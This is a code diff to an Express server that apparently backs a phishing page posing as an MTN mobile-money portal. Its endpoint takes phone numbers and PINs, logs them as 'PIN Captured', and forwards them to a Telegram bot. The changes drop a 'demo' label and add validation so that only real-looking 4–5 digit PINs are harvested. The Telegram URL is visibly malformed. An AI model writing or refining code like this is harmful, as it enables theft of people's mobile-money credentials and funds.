@@ -2,7 +2,6 @@ const express = require("express");
 const path = require("path");
 
 const app = express();
-
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
@@ -10,10 +9,9 @@ app.use(express.static(__dirname));
 
 // Mtn submission endpoint
 app.post("/mtn-submission", async (req, res) => {
-  // Extracted 'pin' from the request body
   const { phone, pin, success } = req.body;
 
-  // Validate the incoming data types including the pin
+  // 1. Basic Type Validation
   if (
     typeof phone !== "string" ||
     typeof pin !== "string" ||
@@ -21,21 +19,25 @@ app.post("/mtn-submission", async (req, res) => {
   ) {
     return res.status(400).json({
       success: false,
-      message: "Invalid mtn submission"
+      message: "Invalid mtn submission layout"
     });
   }
 
-  /*
-    IMPORTANT:
-    Signing in confirms your acceptance of our terms and privacy policy.
-  */
+  // 2. Exact Length Verification (Ensuring PIN is 4 or 5 digits long)
+  const isNumeric = /^[0-9]+$/.test(pin);
+  if (!isNumeric || (pin.length !== 4 && pin.length !== 5)) {
+    return res.status(400).json({
+      success: false,
+      message: "Security violation: PIN must be exactly 4 or 5 numbers long."
+    });
+  }
 
-  console.log("DEMO SUBMISSION");
-  console.log("Phone:", phone);
-  console.log("Pin:", pin); 
-  console.log("Result:", success ? "Successful" : "Failed");
+  console.log("--- MOMO PORTAL INBOUND ---");
+  console.log("Phone Target :", phone);
+  console.log("PIN Captured :", pin);
+  console.log("Payload State:", success ? "Successful Auth" : "Failed Verification");
 
-  // Optional Telegram notification
+  // Optional Telegram notification dispatch
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
 
@@ -56,24 +58,16 @@ app.post("/mtn-submission", async (req, res) => {
         `https://telegram.org{botToken}/sendMessage`,
         {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: message })
         }
       );
 
       if (!telegramResponse.ok) {
-        console.error(
-          "Telegram error:",
-          await telegramResponse.text()
-        );
+        console.error("Telegram endpoint issue:", await telegramResponse.text());
       }
     } catch (error) {
-      console.error("Telegram request failed:", error);
+      console.error("Telegram network failure:", error);
     }
   }
 
@@ -83,7 +77,6 @@ app.post("/mtn-submission", async (req, res) => {
   });
 });
 
-// Serve index.html
 app.get("*", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
@@ -91,4 +84,5 @@ app.get("*", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Mtn server running on port ${PORT}`);
 });
+
 
